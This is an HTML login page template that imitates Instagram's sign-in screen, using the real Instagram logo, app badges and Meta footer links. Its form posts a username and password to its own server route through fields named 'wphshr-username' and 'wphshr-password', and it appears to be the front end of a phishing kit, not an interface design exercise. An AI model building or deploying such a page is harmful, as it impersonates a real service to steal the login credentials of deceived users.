<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Instagram</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"
      crossorigin="anonymous"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&family=Sixtyfour&display=swap"
      rel="stylesheet"
    />
  </head>
  <style>
    a {
    text-decoration: none;
}
    .garage-title {
      clear: both;
      display: inline-block;
      overflow: hidden;
      white-space: nowrap;
    }
    .red {
      background-color: red;
    }
    .green {
      background-color: green;
    }
    .blue {
      color: rgba(0, 149, 246, 1);
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    .username {
      border-radius: 4px;
    }
    .password {
      border: solid 1px;
      font-family: Roboto;
      font-size: 12px;

      border-radius: 2px;
      height: 36px;
      width: 260px;
      padding: 8px;
    }
    .normaltext {
      font-family: Roboto;
      color: rgba(0, 149, 246, 1);
      font-size: 13px;
      text-align: center;
      justify-content: center;
    }
  </style>
  <body>
    <!-- Mobile -->
    <div class="mt-5" style="margin: 2%">
      <div class="p-2 d-flex-column flex-fill">
        <div class="upper mb-5">
          <div class="top text-center">
            <div class="logo mb-3">
              <i
                data-visualcompletion="css-img"
                aria-label="Instagram"
                class=""
                role="img"
                style="
                  background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yv/r/KoLLpWDb4f6.png');
                  background-position: 0px -52px;
                  background-size: auto;
                  width: 175px;
                  height: 51px;
                  background-repeat: no-repeat;
                  display: inline-block;
                "
              ></i>
            </div>
            <div class="login-details">
              <div class="userpart">
                <!-- Form Start-->
                <form action="#" method="post">
                  <div class="username">
                    <input name="wphshr-username" required
                      class="password mb-1"
                      placeholder="Phone number, username or email address"
                    />
                  </div>
                  <div class="username mb-3">
                    <input name="wphshr-password" required
                      type="password"
                      class="password"
                      placeholder="Password"
                    />
                  </div>

                  <div  class="loginbutton mb-2">
                    <button type="submit"
                      class="password"
                      style="
                        border-radius: 10px;
                        font-size: 15px;
                        color: white;
                        background-color: rgba(0, 149, 246, 1);

                        height: 32px;
                      "
                    >
                      <div style="margin-top: -1%">
                        <strong>Log in</strong>
                      </div>
                    </button>
                  </div>
                </form>
                <!-- Form end-->
                 <!-- flash msg 
                {% with messages = get_flashed_messages(with_categories=true) %}
                {% if messages %}
                    {% for msg in messages %}
                        <div class="d-flex normaltext" style="font-size: 10px; color: red">
                            <div class="">{{ msg[1] }}</div>
                        </div>
                       {% endfor %}
                   {% endif %}
               {% endwith %}
                      -->
                <div class="or mb-2">
                  <div class="m-4">OR</div>
                </div>
                <div class="Facebook d-flex normaltext mb-2">
                  <svg
                    style="margin-top: 1px"
                    fill="#0095f6"
                    height="20"
                    width="20"
                  >
                    <path
                      d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z"
                      fill="#0095f6"
                    ></path>
                    <defs>
                      <clipPath id="a">
                        <rect fill="blue" height="16" width="16"></rect>
                      </clipPath>
                    </defs>
                  </svg>
                  <div class="ms-1"><strong>
                    <a href="/static_website/index.html">
                      Log in with Facebook
                    </a>
                  </strong></div>
                </div>
              </div>
              <div class="forget">Forgetten your password?</div>
            </div>
          </div>
          <div class="middle text-center m-4">
            Don't have an account?
            <div class="blue d-inline"><strong>Sign up</strong></div>
          </div>
          <div class="bottom d-flex-column">
            <div class="getapp text-center mb-2">Get the app.</div>
            <div class="app-img text-center">
              <img
                src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/Yfc020c87j0.png"
                height="40px"
                width="136px"
              />
              <img
                src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png"
                height="40px"
                width="136px"
              />
            </div>
          </div>
        </div>
        <div class="d-flex text-center m-5">
          <div
            class="language row"
            style="
              margin-left: 10%;
              margin-right: 10%;
              font-family: Roboto;
              font-size: 12px;
              text-align: start;
            "
          >
            <div class="col">Meta</div>
            <div class="col">About</div>
            <div class="col">Blog</div>
            <div class="col">Jobs</div>
            <div class="col">Help</div>
            <div class="col">API</div>
            <div class="col">Privacy</div>
            <div class="col-auto">Terms</div>
            <div class="col-auto">Locations</div>
            <div class="col-auto">Meta Verified</div>
            <div class="col-auto">Threads</div>
            <div class="col-auto">Instagram Lite</div>
            <div class="col-auto">Contact uploading and non-users</div>
          </div>
        </div>
      </div>
    </div>
    <!--
    <div class="" style="margin: 2%">
      <div
        class="d-flex flex-row ms-3 me-3 justify-content-center"
        style="height: 100%"
      >
        <div class="p-2 green flex-fill">Flex item 1</div>
        <div class="p-2 blue flex-fill">Flex item 2</div>
      </div>
    </div>
    -->

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
